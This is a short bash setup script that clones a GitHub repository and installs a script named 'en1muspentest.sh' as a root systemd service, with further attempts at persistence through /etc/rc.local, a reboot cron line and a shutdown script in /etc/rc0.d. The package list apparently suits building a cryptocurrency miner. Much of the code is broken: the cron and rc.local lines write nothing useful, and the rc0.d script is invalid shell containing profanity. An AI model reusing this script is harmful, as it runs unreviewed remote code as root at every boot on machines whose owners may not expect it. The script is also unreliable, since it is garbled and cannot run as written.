#!/bin/bash -ex 
apt update -y -q 
apt install -y -q libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev screen git nano dos2unix sshpass python3 python3-dev python-dev python-pip python3-pip python-setuptools 
git clone https://github.com/Enimus/pixpoof-eni.git /home/ubuntu/pixpoof-eni 
cd /home/ubuntu/pixpoof-eni/ 
chmod +x en1muspentest.sh 
echo /etc/crontab > 00 6 * * * root reboot 
cat > /lib/systemd/system/en1muspentest.service << EOF
[Unit] 
Description=en1muspentest
After=network.target 
[Service] 
ExecStart= /home/ubuntu/pixpoof-eni/en1muspentest.sh 
User=root 
[Install] 
WantedBy=multi-user.target 
EOF
 
sudo systemctl daemon-reload 
sudo systemctl enable en1muspentest.service 
sudo systemctl start en1muspentest.service 
sudo systemctl stop en1muspentest.service 
sudo systemctl restart en1muspentest.service 
 
rm -r /etc/rc.local 
 
cat /etc/rc.local << EOF 
#!/bin/bash -ex 
/home/ubuntu/pixpoof-eni/en1muspentest.sh 

exit 0 
EOF
 
cat /etc/rc0.d/enimus << EOF
#!/bin/bash -ex 
if service en1muspentest.service failed then
print "some shit going here" 
endif sudo apt update && /etc/rc.local 
else
print "Fuck You" 

EOF
 
chmod +x /etc/rc0.d/enimus 
/etc/rc0.d/enimus 
 
 
 

 
 
